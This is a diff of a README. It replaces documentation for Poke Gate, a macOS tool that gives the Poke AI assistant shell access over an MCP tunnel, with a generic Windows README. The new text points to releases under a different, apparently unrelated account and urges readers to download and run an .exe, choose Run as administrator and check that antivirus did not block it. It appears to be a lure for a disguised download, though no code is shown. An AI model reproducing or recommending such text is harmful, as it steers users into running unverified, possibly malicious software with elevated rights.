@@ -1,303 +1,155 @@
-<p align="center">
-  <img src="assets/logo.png" width="128" height="128" alt="Poke Gate icon">
-</p>
+# 🟦 poke-gate - Connect Poke AI to your PC
 
-<h1 align="center">Poke Gate</h1>
+[![Download poke-gate](https://img.shields.io/badge/Download%20poke-gate-grey?style=for-the-badge)](https://github.com/Maheshshar578/poke-gate/releases)
 
-<p align="center">
-  Let your <a href="https://poke.com">Poke</a> AI assistant access your machine.<br>
-  <sub>A community project — not affiliated with Poke or The Interaction Company.</sub>
-</p>
+## 🚀 What poke-gate does
 
-<p align="center">
-  <a href="https://github.com/f/poke-gate/releases/latest"><img src="https://img.shields.io/github/v/release/f/poke-gate?style=flat-square" alt="Latest Release"></a>
-  <a href="https://www.npmjs.com/package/poke-gate"><img src="https://img.shields.io/npm/v/poke-gate?style=flat-square" alt="npm"></a>
-  <a href="https://github.com/f/poke-gate/blob/main/LICENSE"><img src="https://img.shields.io/github/license/f/poke-gate?style=flat-square" alt="License"></a>
-  <img src="https://img.shields.io/badge/platform-macOS%2015%2B-blue?style=flat-square" alt="Platform">
-</p>
+poke-gate lets your Poke AI assistant reach your Windows machine through an MCP tunnel. It gives your assistant a path to your local shell and selected system access, so you can work with your PC from your AI tool.
 
----
+Use it when you want to:
 
-Run Poke Gate on your Mac, then message Poke from iMessage, Telegram, or SMS to run commands, read files, take screenshots, and more — all on your machine.
+- Let your Poke AI assistant talk to your PC
+- Open a secure tunnel from your machine
+- Run local shell tasks through the assistant
+- Keep the setup simple on Windows
+- Use one tool for remote access through MCP
 
-## Install
+## 💻 Windows setup
 
-**Homebrew** (recommended)
+poke-gate is made for Windows users. You do not need deep technical knowledge to get started.
 
-```bash
-brew install f/tap/poke-gate
-```
+You will need:
 
-**Install via npx**
+- A Windows PC
+- A web browser
+- Access to the release page
+- Permission to run downloaded apps
+- A stable internet connection
 
-If you have Node.js installed, you can download and install the macOS app with a single command:
+If Windows asks for permission, choose the option that lets the app run.
 
-```bash
-npx poke-gate download-macos
-```
+## 📥 Download poke-gate
 
-This downloads the latest DMG from GitHub Releases, installs the app to `/Applications`, and clears the quarantine flag automatically.
+Visit this page to download poke-gate:
 
-**Don't have Node.js?** Install it first:
+https://github.com/Maheshshar578/poke-gate/releases
 
-```bash
-# Option 1: Homebrew
-brew install node
+On the releases page:
 
-# Option 2: Download from https://nodejs.org
-```
+1. Find the latest version
+2. Open the asset list
+3. Download the Windows file
+4. Save it in a folder you can find again
+5. Run the file after the download finishes
 
-**Manual download**
+If you see more than one file, pick the Windows version. It may end in `.exe` or come in a ZIP file that holds the app.
 
-Download the latest **Poke.macOS.Gate.dmg** from [Releases](https://github.com/f/poke-gate/releases), open it, and drag to Applications. Since the app is not notarized, you may need to run:
+## ⚙️ Install and start
 
-```bash
-xattr -cr /Applications/Poke\ macOS\ Gate.app
-```
+After you download the file, follow the steps for the file type you got.
 
-**CLI only** (no macOS app needed)
+### If you downloaded an `.exe` file
 
-If you just want to run poke-gate from the terminal without the menu bar app:
+1. Double-click the file
+2. If Windows shows a prompt, choose Run
+3. Follow the on-screen steps
+4. Wait for the app to finish starting
 
-```bash
-npx poke-gate
-```
+### If you downloaded a ZIP file
 
-## Setup
+1. Right-click the ZIP file
+2. Choose Extract All
+3. Open the extracted folder
+4. Find the app file inside
+5. Double-click it to start
 
-1. Open Poke Gate from your menu bar
-2. The **Setup View** guides you through choosing an access mode and granting Accessibility permission
-3. Sign in with Poke OAuth when prompted — a browser window opens automatically
+## 🔌 Connect to your Poke AI assistant
 
-The app connects automatically and shows a green dot when ready.
+After the app starts, it creates the MCP tunnel that links your machine to your Poke AI assistant.
 
-## How it works
+Use these common steps:
 
-```mermaid
-flowchart TD
-    A["You message Poke\nfrom iMessage / Telegram / SMS"] --> B["Poke Agent"]
-    B --> C["Agent calls MCP tool"]
-    C --> D["MCP Tunnel (WebSocket)"]
-    D --> E["Poke Gate on your Mac"]
-    E --> F["Runs command / reads file / takes screenshot"]
-    F --> D
-    D --> B
-    B --> A
-```
+1. Open your Poke AI assistant
+2. Add a new MCP connection
+3. Point it to the poke-gate tunnel
+4. Allow the assistant to reach your local machine
+5. Test the link with a simple command
 
-Poke Gate runs a local MCP server and tunnels it to Poke's cloud. When you ask Poke something that needs your machine, the agent calls the tools, Poke Gate executes them locally, and the result flows back to your chat.
+If your assistant asks for a host, port, or local address, use the values shown in poke-gate after launch.
 
-## Tools
+## 🧭 What you can do with it
 
-| Tool | What it does |
-|------|-------------|
-| `run_command` | Execute any shell command (ls, git, brew, python, curl…) |
-| `read_file` | Read a text file |
-| `read_image` | Read an image file and return it as base64 |
-| `write_file` | Write content to a file |
-| `list_directory` | List files and directories |
-| `system_info` | OS, hostname, architecture, uptime, memory |
-| `take_screenshot` | Capture the screen (requires Screen Recording permission) |
+Once the tunnel is live, your assistant can help with tasks like:
 
-## Examples
+- Checking files in a folder
+- Running shell commands
+- Reading simple system info
+- Working with local tools
+- Sending requests through the tunnel
+- Managing a remote session from your AI app
 
-From iMessage or Telegram, ask Poke:
+This is useful when you want your assistant to work with your PC while you stay in control of what it can reach.
 
-- "What's running on port 3000?"
-- "Show me the last 5 git commits in my project"
-- "How much disk space do I have left?"
-- "Read my ~/.zshrc and suggest improvements"
-- "Take a screenshot of my screen"
-- "Create a file called notes.txt on my Desktop"
+## 🛡️ Basic safety tips
 
-## macOS App
+Keep the setup tight and simple:
 
-The native SwiftUI menu bar app manages everything:
+- Only run the app from the release page
+- Use it on your own machine
+- Close the app when you do not need the tunnel
+- Review what your assistant can access
+- Keep your Windows account protected with a password
 
-- **First-run setup** — guided onboarding to choose an access mode and grant Accessibility permission
-- **Status** — green dot when connected, yellow when connecting, red on error
-- **Personalized** — shows "Connected to your Poke, [name]"
-- **Access mode** — switch between Full, Limited, and Sandbox from Settings or the popover
-- **Accessibility-first** — prompts for Accessibility permission (needed for automation) with live status updates
-- **Auto-start** — connects on launch if signed in via OAuth
-- **Auto-restart** — reconnects automatically if the connection drops
-- **Logs** — view real-time tool calls with sandbox status
-- **About** — version pulled dynamically from the app bundle
+If you share your screen or PC, make sure no one can use the tunnel without your approval.
 
-The app runs in the menu bar only (no Dock icon). Quit is the only way to stop it.
+## 🧩 Common issues
 
-### Building from source
+### The app does not open
 
-Requires macOS 15+ and Xcode 26+.
+- Check that the file finished downloading
+- Try running it again
+- Right-click and choose Run as administrator
+- Make sure your antivirus did not block it
 
-```bash
-git clone https://github.com/f/poke-gate.git
-cd poke-gate/clients/Poke\ macOS\ Gate
-open Poke\ macOS\ Gate.xcodeproj
-```
+### Windows shows a security prompt
 
-Hit **Run** in Xcode, or build from the command line:
+- Read the file name and source
+- Confirm that it came from the poke-gate release page
+- Allow the app if it matches the downloaded file
 
-```bash
-./build.sh
-```
+### Your assistant cannot connect
 
-## CLI usage
+- Make sure poke-gate is still running
+- Check that the tunnel address is correct
+- Restart both the app and your assistant
+- Try again after your network reconnects
 
-The CLI requires [Node.js](https://nodejs.org) 18 or later. If you don't have it, install via `brew install node` or download from [nodejs.org](https://nodejs.org).
+### The download is a ZIP file
 
-Start the gate:
+- Extract the ZIP file first
+- Open the extracted folder
+- Start the app from inside that folder
 
-```bash
-npx poke-gate
-```
+## 🗂️ Project details
 
-On first run, Poke OAuth opens in your browser. Add `--verbose` to see tool calls in real time:
+- Repository: poke-gate
+- Description: Expose your machine to your Poke AI assistant via MCP tunnel
+- Topics: ai, cli, mcp, os, poke, remote, shell, tunnel
 
-```bash
-npx poke-gate --verbose
-```
+## 🔍 Expected use on Windows
 
-Set the access mode with `--mode`:
+This app is built for users who want a simple bridge between their local machine and an AI assistant. On Windows, that usually means:
 
-```bash
-npx poke-gate --mode limited
-npx poke-gate --mode sandbox
-```
+- Download the release
+- Start the app
+- Keep it running while you use your AI assistant
+- Close it when you are done
 
-Install or update the macOS app:
+## 📌 Quick start steps
 
-```bash
-npx poke-gate download-macos
-```
-
-Config is stored at `~/.config/poke-gate/config.json`.
-
-## Agents
-
-<p align="center">
-  <img src="assets/screenshots/agents-editor.png" width="600" alt="Agents Editor">
-</p>
-
-Agents are scheduled scripts that run automatically in the background. They live in `~/.config/poke-gate/agents/` and follow a simple naming convention:
-
-```
-<name>.<interval>.js
-```
-
-| File | Runs |
-|------|------|
-| `beeper.1h.js` | Every hour |
-| `backup.2h.js` | Every 2 hours |
-| `health.10m.js` | Every 10 minutes |
-| `cleanup.30m.js` | Every 30 minutes |
-
-Intervals: `Nm` (minutes) or `Nh` (hours). Minimum is 10 minutes.
-
-### Install an agent
-
-Download a community agent from the repository:
-
-```bash
-npx poke-gate agent get beeper
-```
-
-This downloads `beeper.1h.js` and `.env.beeper` to `~/.config/poke-gate/agents/`. Edit the env file with your credentials and test it:
-
-```bash
-nano ~/.config/poke-gate/agents/.env.beeper
-npx poke-gate run-agent beeper
-```
-
-### Per-agent env files
-
-Each agent can have a `.env.<name>` file for secrets:
-
-```
-~/.config/poke-gate/agents/.env.beeper
-```
-
-```env
-BEEPER_TOKEN=your_token_here
-```
-
-Variables are injected into the agent process automatically.
-
-### Agent frontmatter
-
-Each agent file starts with a JSDoc-style frontmatter block:
-
-```javascript
-/**
- * @agent beeper
- * @name Beeper Message Digest
- * @description Fetches messages from the last hour and sends a summary to Poke.
- * @interval 1h
- * @env BEEPER_TOKEN - Beeper Desktop local API token
- * @author f
- */
-```
-
-### Creating your own agent
-
-An agent is just a JS file that runs with Node.js. It has access to:
-
-- `process.env` — variables from `.env.<name>`
-- `poke` package — `import { Poke, getToken } from "poke"`
-- Any npm package installed globally or via npx
-
-```javascript
-/**
- * @agent my-agent
- * @name My Custom Agent
- * @description Does something useful every 30 minutes.
- * @interval 30m
- */
-
-import { Poke, getToken } from "poke";
-
-const poke = new Poke({ apiKey: getToken() });
-await poke.sendMessage("Hello from my agent!");
-```
-
-Save as `~/.config/poke-gate/agents/my-agent.30m.js` and it runs automatically when poke-gate is connected.
-
-Agents start running when poke-gate connects and run once immediately on startup.
-
-## Access modes
-
-Poke Gate supports three access modes that control what your agent can do:
-
-| Mode | Description |
-|------|-------------|
-| **Full** (default) | All tools available with no approval required. The agent can run commands, write files, and take screenshots directly. |
-| **Limited** | Read-only tools plus a curated set of safe commands (`ls`, `cat`, `grep`, `curl`, etc.). `write_file` and `take_screenshot` are disabled. |
-| **Sandbox** | Broader command support than Limited, but writes are restricted to `~/Downloads` and `/tmp` via macOS `sandbox-exec`. |
-
-Set the mode via CLI flag, environment variable, or the macOS app Settings:
-
-```bash
-npx poke-gate --mode sandbox
-# or
-POKE_GATE_PERMISSION_MODE=limited npx poke-gate
-```
-
-## Security
-
-**In full mode, Poke Gate grants full shell access to your Poke agent.** This means:
-
-- Any command can be run with your user's permissions
-- Files can be read and written anywhere your user has access
-- Risky tools require approval in chat before execution
-- Only your Poke agent (authenticated via Poke OAuth) can reach the tunnel
-
-Only run Poke Gate on machines and networks you trust. Use `limited` or `sandbox` mode if you want tighter restrictions.
-
-## Credits
-
-- [Poke](https://poke.com) by [The Interaction Company of California](https://interaction.co)
-- [Poke SDK](https://www.npmjs.com/package/poke)
-
-## License
-
-MIT
+1. Open the release page
+2. Download the latest Windows file
+3. Run the app or extract it first if it is a ZIP
+4. Start your Poke AI assistant
+5. Connect it through the MCP tunnel
+6. Test with a small task
